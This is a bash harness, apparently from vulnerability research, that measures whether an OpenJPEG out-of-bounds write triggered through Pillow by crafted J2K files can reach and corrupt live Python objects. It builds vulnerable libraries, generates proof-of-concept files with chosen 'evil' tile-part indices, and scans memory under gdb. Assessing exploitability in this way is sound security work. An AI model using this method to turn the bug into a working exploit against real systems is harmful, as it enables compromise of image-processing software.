#!/usr/bin/env bash
# Measure whether the strided OOB write can reach a gap-aligned live Python
# object. The 24-byte tp_index stride writes at base+24k+8 and +24k+16 and
# leaves base+24k..+24k+7 untouched, so an object whose ob_refcnt sits at
# base+24k would keep its small refcnt while ob_type takes the store at +8.
# This harness scans the real pinned build and checks the reachability of such
# objects. Local process only; gdb observes, never writes memory.
#
# Usage: bash gap-reach.sh OUTDIR
set -u

HERE=$(cd "$(dirname "$0")" && pwd)
OUT=$(mkdir -p "$1" && cd "$1" && pwd)
ADDR=0xa3bf20                          # &PyLong_Type, pinned non-PIE CPython 3.12.3
WANT=$((ADDR))

VLSRC="$OUT/src/openjpeg-2.5.4"
mkdir -p "$OUT/src"
tar -xzf "$HERE/src/openjpeg-2.5.4.tar.gz" -C "$OUT/src"
cmake -S "$VLSRC" -B "$OUT/dbg-build" -DBUILD_SHARED_LIBS=ON -DBUILD_CODEC=OFF \
  -DBUILD_TESTING=OFF -DCMAKE_BUILD_TYPE=Debug \
  -DCMAKE_C_FLAGS="-g -O0 -fno-omit-frame-pointer" \
  -DCMAKE_INSTALL_PREFIX="$OUT/dbg-install" > "$OUT/cmake.log" 2>&1
cmake --build "$OUT/dbg-build" -j4 > "$OUT/build.log" 2>&1
cmake --install "$OUT/dbg-build" > "$OUT/install.log" 2>&1
[ -f "$OUT/dbg-install/lib/libopenjp2.so.7" ] || { echo "FAIL debug lib build"; exit 1; }

PILROOT="$OUT/pc/pw-vuln"
if [ ! -d "$PILROOT/PIL" ]; then
  bash "$HERE/pillow-consumer.sh" "$OUT/pc" > /dev/null 2>&1
  [ -d "$PILROOT/PIL" ] || { echo "FAIL pillow build"; exit 1; }
fi

n=0
pass() { n=$((n+1)); echo "PASS $n $1"; }
fail() { echo "FAIL $1"; exit 1; }

: > "$OUT/trace.txt"
ANY_GAP=0
# label evil target
while read -r label evil target; do
  [ -n "$label" ] || continue
  python3 "$HERE/make-large-tpsot.py" "$HERE/src/poc.j2k" "$OUT/$label.j2k" \
    "$target" "$evil" > "$OUT/$label.gen.log" 2>&1
  LD_LIBRARY_PATH="$OUT/dbg-install/lib" PILROOT="$PILROOT" \
    gdb -q -batch -x "$HERE/gap-scan.gdb" --args \
    python3 "$HERE/pillow-probe.py" "$OUT/$label.j2k" > "$OUT/$label.gdb.log" 2>&1
  grep '^OBJ ' "$OUT/$label.gdb.log" >> "$OUT/trace.txt" || true
  BASE=$(sed -n 's/^BASE=\(0x[0-9a-f]*\)$/\1/p' "$OUT/$label.gdb.log")
  [ -n "$BASE" ] || fail "$label: no sink observation"

  # Gap-aligned objects sit at off = 24k; index k is the TPsot needed to hit
  # their ob_type. KEEP the scan honest: require at least one such object.
  GAP_COUNT=$(grep '^OBJ ' "$OUT/$label.gdb.log" | grep -c 'mod24=0 ' || true)
  [ "$GAP_COUNT" -gt 0 ] || fail "$label: scanner found no gap-aligned objects"
  ANY_GAP=$((ANY_GAP+GAP_COUNT))
  MIN_IDX=$(grep '^OBJ ' "$OUT/$label.gdb.log" | grep 'mod24=0 ' \
    | sed -n 's/.*off=\([0-9]*\) .*/\1/p' | sort -n | head -1)
  MIN_IDX=$((MIN_IDX / 24))
  echo "$label evil=$evil min_gap_index=$MIN_IDX gap_count=$GAP_COUNT"
  [ "$MIN_IDX" -gt "$evil" ] || fail "$label: gap object at index $MIN_IDX is reachable by TPsot=$evil"
done <<EOF
takeover 48 10731952
mid 154 10731296
large 184 10731296
EOF

[ "$ANY_GAP" -gt 0 ] || fail "no gap-aligned live object found in any layout"
pass "gap-aligned live objects exist (count=$ANY_GAP)"
pass "every gap-aligned object lies beyond the reachable TPsot in all 3 layouts"

echo "RESULT $n PASS / 0 FAIL"
sha256sum "$OUT/trace.txt"
